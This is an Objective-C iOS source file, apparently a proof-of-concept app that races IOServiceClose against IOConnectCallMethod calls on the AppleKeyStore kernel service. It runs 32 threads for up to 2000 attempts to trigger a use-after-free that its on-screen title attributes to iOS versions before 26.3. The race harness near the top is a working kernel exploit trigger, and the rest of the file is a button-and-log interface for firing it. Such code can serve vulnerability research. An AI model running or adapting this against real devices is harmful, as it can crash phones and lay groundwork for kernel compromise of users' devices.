#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   32
#define MAX_ATTEMPTS 2000

static atomic_int   g_phase  = 0;
static io_connect_t g_conn   = IO_OBJECT_NULL;
static atomic_uint  g_calls  = 0;
static atomic_uint  g_errors = 0;

static void *racer_thread(void *arg) {
    (void)arg;
    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
        ;
    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
        uint64_t input[1] = {0};
        uint32_t out_cnt  = 0;
        kern_return_t kr = IOConnectCallMethod(
            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
            break;
        }
    }
    return NULL;
}

static int run_attempt(void) {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
    if (svc == IO_OBJECT_NULL)
        return -1;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL)
        return -1;

    atomic_store_explicit(&g_phase, 0, memory_order_release);
    atomic_store_explicit(&g_calls, 0, memory_order_relaxed);
    atomic_store_explicit(&g_errors, 0, memory_order_relaxed);

    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_create(&threads[i], NULL, racer_thread, NULL);

    atomic_store_explicit(&g_phase, 1, memory_order_release);
    usleep(500);

    IOServiceClose(g_conn);
    atomic_store_explicit(&g_phase, 2, memory_order_release);
    usleep(20000);

    atomic_store_explicit(&g_phase, 3, memory_order_release);
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_join(threads[i], NULL);

    mach_port_deallocate(mach_task_self(), g_conn);
    g_conn = IO_OBJECT_NULL;
    return 0;
}

@interface ViewController ()
@property (nonatomic, strong) UIButton   *triggerButton;
@property (nonatomic, strong) UILabel    *statusLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, assign) BOOL        running;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;
    [self buildUI];
}

- (void)buildUI {
    UILabel *title = [[UILabel alloc] init];
    title.text = @"AppleKeyStoreUserClient\nclose() UAF";
    title.font = [UIFont fontWithName:@"Menlo-Bold" size:18];
    title.textColor = UIColor.whiteColor;
    title.textAlignment = NSTextAlignmentCenter;
    title.numberOfLines = 2;
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    UILabel *subtitle = [[UILabel alloc] init];
    subtitle.text = @"IOServiceClose vs externalMethod race\niOS <26.3 RC";
    subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
    subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
    subtitle.textAlignment = NSTextAlignmentCenter;
    subtitle.numberOfLines = 2;
    subtitle.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:subtitle];

    self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.triggerButton setTitle:@"CLOSE() UAF" forState:UIControlStateNormal];
    self.triggerButton.titleLabel.font = [UIFont fontWithName:@"Menlo-Bold" size:22];
    [self.triggerButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
    self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    self.triggerButton.layer.cornerRadius = 12;
    self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.triggerButton addTarget:self action:@selector(triggerTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.triggerButton];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"Ready";
    self.statusLabel.font = [UIFont fontWithName:@"Menlo" size:14];
    self.statusLabel.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusLabel];

    self.logView = [[UITextView alloc] init];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [title.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [title.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [subtitle.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:8],
        [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.triggerButton.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:24],
        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.triggerButton.widthAnchor constraintEqualToConstant:240],
        [self.triggerButton.heightAnchor constraintEqualToConstant:56],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.triggerButton.bottomAnchor constant:16],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
    ]];
}

- (void)appendLog:(NSString *)line {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", line];
        [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length - 1, 1)];
    });
}

- (void)setStatus:(NSString *)text color:(UIColor *)color {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
        self.statusLabel.textColor = color;
    });
}

- (void)triggerTapped {
    if (self.running) return;
    self.running = YES;
    self.logView.text = @"";
    self.triggerButton.enabled = NO;
    self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];

    [self appendLog:[NSString stringWithFormat:@"[*] %d attempts, %d racers/attempt", MAX_ATTEMPTS, NUM_RACERS]];
    [self setStatus:@"Checking service..." color:UIColor.yellowColor];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        io_service_t svc = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
        if (svc == IO_OBJECT_NULL) {
            [self appendLog:@"[-] AppleKeyStore not found"];
            [self setStatus:@"Service not found" color:UIColor.redColor];
            [self finishRun];
            return;
        }
        IOObjectRelease(svc);
        [self appendLog:@"[+] AppleKeyStore found"];
        [self setStatus:@"Racing..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];

        for (int i = 0; i < MAX_ATTEMPTS; i++) {
            if (run_attempt() < 0)
                usleep(50000);
            usleep(1000);

            if ((i + 1) % 50 == 0 || i == 0) {
                [self appendLog:[NSString stringWithFormat:@"[%4d] calls=%u port_dead=%u",
                                 i + 1, atomic_load(&g_calls), atomic_load(&g_errors)]];
                [self setStatus:[NSString stringWithFormat:@"Attempt %d/%d", i + 1, MAX_ATTEMPTS]
                          color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
            }
        }

        [self appendLog:[NSString stringWithFormat:@"\nDone. %d attempts, no panic.", MAX_ATTEMPTS]];
        [self setStatus:@"Done (no panic)" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
        [self finishRun];
    });
}

- (void)finishRun {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.running = NO;
        self.triggerButton.enabled = YES;
        self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    });
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

@end
